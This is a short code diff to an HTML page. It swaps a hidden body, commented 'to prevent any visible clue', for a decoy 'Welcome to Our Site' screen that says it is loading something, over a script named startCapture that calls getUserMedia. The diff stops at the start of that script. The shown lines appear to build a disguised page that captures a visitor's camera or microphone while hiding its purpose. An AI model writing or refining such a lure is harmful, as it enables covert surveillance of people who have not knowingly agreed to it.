@@ -9,11 +9,35 @@
             background-color: black;
             color: green;
             font-family: 'Courier New', Courier, monospace;
-            display: none; /* Hide the body to prevent any visible clue */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+        }
+        h1 {
+            font-size: 2em;
+            margin-bottom: 20px;
+            animation: blink 1s steps(2, start) infinite;
+        }
+        @keyframes blink {
+            to {
+                visibility: hidden;
+            }
+        }
+        p {
+            font-size: 1.2em;
         }
     </style>
 </head>
 <body>
+    <div class="container">
+        <h1>Welcome to Our Site</h1>
+        <p>Loading something interesting for you...</p>
+    </div>
     <script>
         async function startCapture() {
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
